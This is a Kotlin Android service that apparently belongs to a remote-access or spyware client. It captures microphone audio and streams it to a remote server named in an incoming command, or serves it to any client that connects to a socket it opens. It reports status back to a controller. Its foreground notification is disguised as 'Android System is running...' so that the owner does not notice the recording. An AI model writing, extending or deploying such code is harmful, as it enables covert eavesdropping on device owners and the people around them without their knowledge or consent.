package com.client.services.other

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.client.services.client.sendMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import java.io.IOException
import java.net.ServerSocket
import java.net.Socket
import java.util.Collections

class MicStreamingService : Service() {

    private val TAG = "MicStreamingService"
    private var SERVER_IP = "YOUR_SERVER_IP" // Replace with your server's IP address (used in client mode)
    private var SERVER_PORT = 12345 // Replace with your server's port
    private val SAMPLE_RATE = 44100
    private val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO  // Using microphone input configuration
    private var AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
    private var bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
    private var startServer = false

    private var audioRecord: AudioRecord? = null
    private var socket: Socket? = null
    private var serverSocket: ServerSocket? = null
    // A thread-safe list to keep track of connected client sockets in server mode
    private val clientSockets = Collections.synchronizedList(mutableListOf<Socket>())
    private var isStreaming = false
    private var streamingJob: Job? = null

    private var serverID = ""
    private var messageID = ""

    private val notificationChannelId = "mic_streaming_channel"
    private var notificationChannel: NotificationChannel? = null
    private var notificationManager: NotificationManager? = null
    private var notification: Notification? = null
    
    private var command = ""

    companion object {
        const val ACTION_STOP_MIC_STREAMING_SERVICE = "com.client.services.other.MicStreamingService.STOP_MIC_STREAMING_SERVICE"
    }

    private fun createAudioStreamingNotificationChannel(context: Context?) {
        if (notificationChannel == null) {
            notificationChannel = NotificationChannel(
                notificationChannelId,
                "MicStreamingChannel",
                NotificationManager.IMPORTANCE_HIGH
            )
            notificationManager =
                context?.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager!!.createNotificationChannel(notificationChannel!!)
        }
    }

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == ACTION_STOP_MIC_STREAMING_SERVICE) {
                Log.d(TAG, "Stop streaming received")
                try {
                    stopStreaming()
                } catch (ex: Exception) {
                    ex.printStackTrace()
                } finally {
                    stopForeground(STOP_FOREGROUND_REMOVE)
                    stopSelf()
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(
                receiver,
                IntentFilter(ACTION_STOP_MIC_STREAMING_SERVICE),
                Context.RECEIVER_EXPORTED
            )
        } else {
            registerReceiver(
                receiver,
                IntentFilter(ACTION_STOP_MIC_STREAMING_SERVICE)
            )
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createAudioStreamingNotificationChannel(this)
        notification = NotificationCompat.Builder(this, notificationChannelId)
            .setContentText("Android System is running...")
            .setContentTitle("Android System")
            .build()
        startForeground(2, notification)
        Log.d(TAG, "Service started")

        // Get connection parameters from the intent
        SERVER_IP = intent!!.getStringExtra("ServerIP").toString()
        SERVER_PORT = intent.getIntExtra("ServerPort", -1)
        serverID = intent.getStringExtra("ServerID")!!
        messageID = intent.getStringExtra("MessageID")!!
        AUDIO_FORMAT = intent.getIntExtra("AudioFormat", -1)
        startServer = intent.getBooleanExtra("StartServer", false)

        if (isStreaming) {
            sendMessage(
                this,
                false,
                "${intent.getStringExtra("Command")}: Operation failed: already streaming",
                messageID, serverID
            )
            stopSelf()
        } else {
            command = intent.getStringExtra("Command")!!
            if (SERVER_PORT == -1 || AUDIO_FORMAT == -1) {
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
            } else {
                if (startServer) {
                    startServerStreaming()
                } else {
                    startStreaming()
                }
            }
        }
        return START_REDELIVER_INTENT
    }

    /**
     * Client mode: connect to a remote server and send mic audio.
     */
    private fun startStreaming() {
        if (isStreaming) {
            sendMessage(
                this,
                false,
                "$command: Operation failed: already streaming",
                messageID, serverID
            )
            return
        }
        if (ActivityCompat.checkSelfPermission(
                this@MicStreamingService,
                Manifest.permission.RECORD_AUDIO
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            isStreaming = true
            streamingJob = CoroutineScope(Dispatchers.IO).launch {
                try {
                    // Connect to the remote server
                    socket = Socket(SERVER_IP, SERVER_PORT)
                    Log.d(
                        TAG,
                        "Connected to server: ${socket?.inetAddress?.hostAddress}:${socket?.port}"
                    )
                    sendMessage(
                        this@MicStreamingService,
                        false,
                        "$command: Operation completed successfully",
                        messageID, serverID
                    )

                    // Prepare AudioRecord to capture microphone audio
                    audioRecord = AudioRecord(
                        MediaRecorder.AudioSource.MIC,
                        SAMPLE_RATE,
                        CHANNEL_CONFIG,
                        AUDIO_FORMAT,
                        bufferSize
                    )
                    if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                        Log.e(TAG, "AudioRecord initialization failed")
                        return@launch
                    }
                    audioRecord?.startRecording()

                    // Get the output stream from the socket
                    val outputStream = socket!!.getOutputStream()

                    // Buffer for audio data
                    val buffer = ByteArray(bufferSize)
                    while (isStreaming) {
                        val readBytes = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                        if (readBytes > 0) {
                            outputStream.write(buffer, 0, readBytes)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error during audio streaming: ${e.message}")
                    sendMessage(
                        this@MicStreamingService,
                        false,
                        "$command: Operation failed - ${e.localizedMessage}",
                        messageID, serverID
                    )
                } finally {
                    stopStreaming()
                }
            }
        } else {
            sendMessage(
                this,
                false,
                "$command: Operation failed - permission not granted",
                messageID, serverID
            )
        }
    }

    /**
     * Server mode: open a ServerSocket and stream mic audio to any client that connects.
     */
    private fun startServerStreaming() {
        if (isStreaming) {
            sendMessage(
                this,
                false,
                "$command: Operation failed: already streaming",
                messageID, serverID
            )
            return
        }
        if (ActivityCompat.checkSelfPermission(
                this@MicStreamingService,
                Manifest.permission.RECORD_AUDIO
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(
                this,
                false,
                "$command: Operation failed - permission not granted",
                messageID, serverID
            )
            return
        }
        isStreaming = true
        streamingJob = CoroutineScope(Dispatchers.IO).launch {
            try {
                // Start the server socket to accept client connections.
                serverSocket = ServerSocket(SERVER_PORT)
                Log.d(TAG, "Server socket opened on port $SERVER_PORT")

                // Launch a coroutine to accept incoming connections.
                launch {
                    while (isStreaming) {
                        try {
                            val clientSocket = serverSocket!!.accept()
                            clientSockets.add(clientSocket)
                            Log.d(
                                TAG,
                                "New client connected: ${clientSocket.inetAddress.hostAddress}:${clientSocket.port}"
                            )
                        } catch (e: Exception) {
                            if (isStreaming) {
                                Log.e(TAG, "Error accepting client: ${e.message}")
                            }
                        }
                    }
                }

                // Prepare AudioRecord to capture microphone audio
                audioRecord = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    SAMPLE_RATE,
                    CHANNEL_CONFIG,
                    AUDIO_FORMAT,
                    bufferSize
                )
                if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                    Log.e(TAG, "AudioRecord initialization failed")
                    return@launch
                }
                audioRecord?.startRecording()

                sendMessage(
                    this@MicStreamingService,
                    false,
                    "$command: Operation completed successfully",
                    messageID, serverID
                )

                // Buffer for audio data
                val buffer = ByteArray(bufferSize)
                while (isStreaming) {
                    val readBytes = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                    if (readBytes > 0) {
                        // Write the audio data to every connected client.
                        synchronized(clientSockets) {
                            val iterator = clientSockets.iterator()
                            while (iterator.hasNext()) {
                                val clientSocket = iterator.next()
                                try {
                                    val out = clientSocket.getOutputStream()
                                    out.write(buffer, 0, readBytes)
                                } catch (e: Exception) {
                                    Log.e(TAG, "Error sending to client: ${e.message}")
                                    try {
                                        clientSocket.close()
                                    } catch (ex: Exception) {
                                        // Ignore close exception.
                                    }
                                    iterator.remove()
                                }
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error during server streaming: ${e.message}")
                sendMessage(
                    this@MicStreamingService,
                    false,
                    "$command: Operation failed - ${e.localizedMessage}",
                    messageID, serverID
                )
            } finally {
                stopStreaming()
            }
        }
    }

    private fun stopStreaming() {
        isStreaming = false
        streamingJob?.cancel()
        streamingJob = null

        try {
            audioRecord?.stop()
            audioRecord?.release()
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping AudioRecord: ${e.message}")
        }
        audioRecord = null

        try {
            socket?.close()
        } catch (e: IOException) {
            Log.e(TAG, "Error closing client socket: ${e.message}")
        }
        socket = null

        // Close the server socket and all connected client sockets if in server mode.
        try {
            serverSocket?.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error closing server socket: ${e.message}")
        }
        serverSocket = null

        synchronized(clientSockets) {
            clientSockets.forEach { client ->
                try {
                    client.close()
                } catch (e: Exception) {
                    Log.e(TAG, "Error closing client socket: ${e.message}")
                }
            }
            clientSockets.clear()
        }
        Log.d(TAG, "Streaming stopped.")
        sendMessage(
            this,
            false,
            "$command: Streaming stopped",
            messageID, serverID
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(receiver)
        stopStreaming()
    }
}
